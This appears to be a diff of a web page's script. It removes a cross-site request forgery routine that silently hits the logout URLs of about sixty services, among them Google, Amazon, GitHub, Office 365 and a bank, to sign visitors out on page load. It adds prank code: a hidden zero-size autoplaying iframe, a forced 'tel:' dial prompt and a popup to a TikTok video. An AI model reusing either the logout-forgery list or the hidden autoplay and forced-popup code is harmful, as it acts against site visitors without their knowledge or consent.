@@ -215,92 +215,16 @@ if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigat
 
 
 
+<iframe id="test" type="text/html" width="0" height="0"
+src="https://www.youtube.com/embed/VfQQWjXV2Js?autoplay=1&fs=0&loop=1"
+frameborder="0" allowfullscreen/>
 
-  window.onload = function() {
-    doSites(document.getElementById("sitelist"), [
-      ["AOL", and(get("http://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us"), get("https://api.screenname.aol.com/auth/logout?state=snslogout&r=" + Math.random()))],
-      ["Apple", get("https://appleid.apple.com/account/signout")],
-      ["AlternativeTo", get ("https://alternativeto.net/Logout.aspx")],
-      ["Amazon", get("http://www.amazon.com/gp/flex/sign-out.html?action=sign-out")],
-      ["Baidu", get("https://passport.baidu.com/?logout&u=https://www.baidu.com")],
-      ["Blogger", get("http://www.blogger.com/logout.g")],
-      ["Delicious", get("http://www.delicious.com/logout")],
-      ["DeviantART", post("http://www.deviantart.com/users/logout")],
-      ["DreamHost", get("https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout")],
-      ["Dropbox", get("https://www.dropbox.com/logout")],
-      ["eBay", get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")],
-      ["Gandi", get("https://www.gandi.net/login/out")],
-      ["GearBest", get("http://www.gearbest.com/m-users-a-logout.htm")],
-      ["GitHub", get("https://github.com/logout")],
-      ["Modd", get("https://www.modd.io/logout")],
-      ["Newground", get("https://www.newgrounds.com/logout")],
-      ["Nytime", get("https://myaccount.nytimes.com/auth/logout")],
-      ["tik", get("https://www.tiktok.com/logout?redirect_url=https%3A%2F%2Fwww.tiktok.com%2Fen%2F")],
-      ["GMail", get("http://mail.google.com/mail/?logout")],
-      ["Google", get("https://www.google.com/accounts/Logout")],
-      ["Hulu", get("https://secure.hulu.com/logout")],
-      ["Impots.gouv.fr", get("https://cfspart.impots.gouv.fr/deconnexion")],
-      ["Instapaper", get("http://www.instapaper.com/user/logout")],
-      ["KanbanFlow", get("https://kanbanflow.com/logout")],
-      ["LaBanquePostale", get("https://voscomptesenligne.labanquepostale.fr/voscomptes/canalXHTML/securite/deconnexion/init-deconnexion.ea")],
-      ["Linode", get("https://manager.linode.com/session/logout")],
-      ["LiveJournal", post("http://www.livejournal.com/logout.bml", {"action:killall": "1"})],
-      ["LogMeIn", get("https://secure.logmein.com/home/fr/loggedout")],
-      ["MySpace", get("http://www.myspace.com/index.cfm?fuseaction=signout")],
-      ["NetFlix", get("http://www.netflix.com/Logout")],
-      ["New York Times", get("http://www.nytimes.com/logout")],
-      ["Newegg", get("https://secure.newegg.com/NewMyAccount/AccountLogout.aspx")],
-      ["Office 365 Global Account", get("https://login.microsoftonline.com/logout.srf")],
-      ["Office 365 Webmail", get("https://outlook.office.com/owa/logoff.owa")],
-      ["Pandora", get("https://www.pandora.com/account/sign-out")],
-      ["Photobucket", get("http://photobucket.com/logout")],
-      ["Primewire.AG", get("https://www.primewire.ag/logout.php")],
-      ["Primewire.ORG", get("https://www.primewire.org/logout.php")],
-      ["Skype", get("https://secure.skype.com/account/logout")],
-      ["Slashdot", get("http://slashdot.org/my/logout")],
-      ["SoundCloud", get("http://soundcloud.com/logout")],
-      ["Spotify", get("https://www.spotify.com/logout/")],
-      ["Steam Community", get("http://steamcommunity.com/?action=doLogout")],
-      ["Steam Store", get("http://store.steampowered.com/logout/")],
-      ["ThePirateBay", get("https://thepiratebay.org/logout")],
-      ["ThinkGeek", get("https://www.thinkgeek.com/brain/account/login.cgi?a=lo")],
-      ["Threadless", get("http://www.threadless.com/logout")],
-      ["Tumblr", get("http://www.tumblr.com/logout")],
-      ["Testomato", get("http://www.testomato.com/logout")],
-      ["Vimeo", get("http://vimeo.com/log_out")],
-      ["Wikipedia", get("http://en.wikipedia.org/w/index.php?title=Special:UserLogout")],
-      ["Windows Live", get("http://login.live.com/logout.srf")],
-      ["Woot", get("https://account.woot.com/logout")],
-      ["Wordpress", get("https://wordpress.com/wp-login.php?action=logout")],
-      ["Yahoo!", get("https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=http://www.yahoo.com/")],
-      ["YouTube", post("http://www.youtube.com", {"action_logout": "1"}, true)],
-      ["DueDil", get("http://www.duedil.com/logout")],
-      ["Podio", get("https://podio.com/logout")],
-      ["Codeanywhere", get("https://codeanywhere.com/logout")],
-      ["NESCAFE Dolce Gusto", get("https://www.dolce-gusto.fr/customer/account/logout")],
-      ["T411", get("http://www.t411.li/users/logout/")],
-    ])
-  };
-
-  var _gaq = _gaq || [];
-  _gaq.push(['_setAccount', 'UA-62125712-1']);
-  _gaq.push(['_trackPageview']);
-
-  (function() {
-    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-  })();
+window.open('tel:2029');
 
 
 
 
-
-
-
-
-
-
+window.open("https://www.tiktok.com/@sus.soundss/video/7014179069768043782?is_copy_url=1&is_from_webapp=v1");
 
 
 
